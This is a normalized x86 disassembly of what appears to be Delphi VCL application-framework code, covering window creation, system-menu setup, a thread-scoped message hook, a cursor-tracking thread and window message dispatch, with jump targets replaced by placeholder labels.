xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45ae54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45af90 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45b004
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45a75c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_413f44
mov dl [ ebp - 0x1 ]
call sub_45ae54
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45a748
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413de8
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413fc0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_413f44
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45adf4
test al al
je r-xdata
inc esi
sub_45b150
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45a75c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45a748
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45b1a8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45b150
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b222
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45b004
pop ecx
push ebp
mov al 0x2
call sub_45b004
pop ecx
push ebp
mov al 0x3
call sub_45b004
pop ecx
push ebp
mov al 0x4
call sub_45b004
pop ecx
push ebp
mov al 0x5
call sub_45b004
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_45b230
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45adc4
xor eax eax
push ebp
push sub_45b2a9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45b1a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45adcc
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45b2c4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403fa8
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403ffc
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45b31c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4036f8#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45d768
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45b370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43b798
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45d7e4
sub_45b3cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45c884
sub_45b410
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45b3cc
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45b370
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45b484
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45b4e0
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45b510
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45b538
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45b4e0
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45b510
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45b510
sub_45b578
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a2c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45cc50
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237ec
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_423bbc
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45d3e8
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c578
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45ce48
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c5a0
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408718
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404218
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_45d5c4
mov eax ebx
call sub_45df88
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45b880
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_45b761
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_45df98
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45cc50
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45ce48
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45d7e4
xor edx edx
mov eax esi
call sub_45d160
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a78
push esi
push sub_45bcb4
mov eax esi
call sub_45ca3c
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4056c4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403258
mov eax [ esi + 0x90 ]
call sub_403258
mov eax [ esi + 0x98 ]
call sub_403258
test bl bl
jle r-xdata
call sub_41ab54
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_45b880
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45ba21
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ba28
lea eax [ ebp - 0x2c ]
call sub_403fa8
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45be00
call sub_41aabc
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404468
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406a98
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403fa8
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45c504
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45c504
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45ba30
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45a764
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45ba90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413de8
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_443708
cmp ebx eax
je r-xdata
sub_45bb00
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45ba90
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413f44
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45bc18
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413f44
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45bcb4
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c840
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45ac70
mov eax [ rw-data ]
call sub_45b2b8
sub_45bd0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45bd69
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bd70
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4041a0
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45bd78
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45bdb4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45c504
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45be00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_45c4ba
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45bcb4
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45cf20
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_413f44
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_443708
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
